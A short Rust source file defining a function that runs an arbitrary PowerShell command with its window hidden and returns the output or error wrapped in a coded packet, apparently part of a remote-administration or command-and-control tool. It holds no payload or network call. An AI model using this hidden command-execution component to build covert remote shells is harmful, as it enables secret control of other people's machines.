use std::process::Command;

use crate::types::{Codes, Packet};

pub fn powershell(command: &str) -> Packet {
    let output = Command::new("powershell")
        .args(&["-WindowStyle", "hidden", "-Command", command])
        .output()
        .expect("Failed to execute PowerShell command");

    if output.stderr.len() > 0 {
        return Packet::new(Codes::ERROR, &output.stderr);
    }
    Packet::new(Codes::Success, &output.stdout)
}
